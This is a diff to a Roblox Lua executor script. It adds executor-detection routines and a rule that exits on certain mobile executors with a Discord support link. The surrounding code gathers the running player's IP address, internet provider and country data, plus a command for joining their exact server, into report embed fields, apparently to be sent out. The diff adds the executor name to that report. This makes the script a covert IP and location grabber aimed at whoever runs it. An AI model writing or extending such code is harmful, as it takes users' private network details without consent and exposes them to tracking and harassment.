@@ -4,6 +4,137 @@ local placeId = game.PlaceId
 local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")
 local gameUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName
 local HttpService = game:GetService("HttpService")
+local function safe_pcall(fn, ...)
+    local ok, res = pcall(fn, ...)
+    if ok then return res end
+    return nil
+end
+
+local function check_globals()
+    if syn and type(syn) == "table" then
+        return "Synapse (dude how ur using synapse)"
+    end
+    if KRNL_LOADED or getgenv and getgenv().KRNL_LOADED then
+        return "KRNL"
+    end
+    if is_sirhurt_closure or getgenv and getgenv().Is_Sirhurt then
+        return "SirHurt"
+    end
+    if pebc_execute then
+        return "ProtoSmasher"
+    end
+    if bit and bit.rshift and (type(bit.rshift) == "function") and not (jit) then
+    end
+    if rconsoleprint or rconsolecreate then
+        return "Executor com rconsole (possível desenvolvedor)"
+    end
+    if writefile and readfile and isfile then
+        return "Support filesystem"
+    end
+    if hookfunction or hookmetamethod then
+        return "Executor com hooks (hookfunction/hookmetamethod)"
+    end
+    return nil
+end
+
+local function check_api_names()
+    if type(identifyexecutor) == "function" then
+        local name = safe_pcall(identifyexecutor)
+        if type(name) == "string" and name ~= "" then
+            return name
+        end
+    end
+    if type(getexecutorname) == "function" then
+        local name = safe_pcall(getexecutorname)
+        if type(name) == "string" and name ~= "" then
+            return name
+        end
+    end
+    if type(getexecutor) == "function" then
+        local name = safe_pcall(getexecutor)
+        if type(name) == "string" and name ~= "" then
+            return name
+        end
+    end
+    return nil
+end
+
+local function check_shared()
+    if shared then
+        if shared.Prot and type(shared.Prot) == "string" then
+            return shared.Prot
+        end
+        if shared._ISEXECUTOR then
+            return tostring(shared._ISEXECUTOR)
+        end
+        if shared.ExecutorName and type(shared.ExecutorName) == "string" then
+            return shared.ExecutorName
+        end
+    end
+    if getgenv then
+        local g = getgenv()
+        if g._EXECUTOR_NAME and type(g._EXECUTOR_NAME) == "string" then
+            return g._EXECUTOR_NAME
+        end
+    end
+    return nil
+end
+
+local function check_request_variants()
+    local httpCandidates = {
+        "request", "http_request", "http.request", "syn.request", "http",
+    }
+    for _, name in ipairs(httpCandidates) do
+        local ok, val = pcall(function() return _G[name] end)
+        if ok and val then
+            return "HTTP API ("..tostring(name)..")"
+        end
+    end
+    
+    if http_request or (syn and syn.request) then
+        return "HTTP (syn/http_request)"
+    end
+    return nil
+end
+
+local function detect_executor()
+    -- ordem: APIs explícitas -> shared/getgenv -> globals/heurísticas -> fallback
+    local detectors = {
+        check_api_names,
+        check_shared,
+        check_globals,
+        check_request_variants,
+    }
+
+    for _, fn in ipairs(detectors) do
+        local ok, res = pcall(fn)
+        if ok and res and type(res) == "string" and res ~= "" then
+            return res
+        end
+    end
+    
+    if getreg or debug and debug.getinfo then
+        return "Executor (debug/getreg)"
+    end
+
+    return game.Players.LocalPlayer.Name.."#"..game.Players.LocalPlayer.UserId
+end
+
+-- Lista de executores que NÃO suportam sistema de arquivos
+local no_file_system = {
+    ["Arceus X"] = true,
+    ["Delta"] = false,
+    ["Vega X"] = true,
+    ["Fluxus Mobile"] = true,
+    ["Titan"] = true,
+    ["Exec X Mobile"] = true,
+}
+-- Uso
+local executorName = detect_executor()
+if no_file_system[executorName] then
+    warn(executorName.." does not support Dodo Development#157. Contact our support at discord.gg/Tn8yx4n5")
+    return
+end
 
 -- função de request com timeout
 local function dataSAT(tab)
@@ -74,7 +205,7 @@ local function getPopulation()
     end
     local data = HttpService:JSONDecode(response.Body)
     return data.country_population
-    end
+end
 
 local Colors = {
     y = 16776960,
@@ -94,6 +225,7 @@ local embedFields = {
     { name = "IP:", value = ip },
     { name = "Provider:", value = wifi },
     { name = "Population:", value = population },
+    { name = "Executor:", value = executorName },
     {
         name = "Place:",
         value = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)'
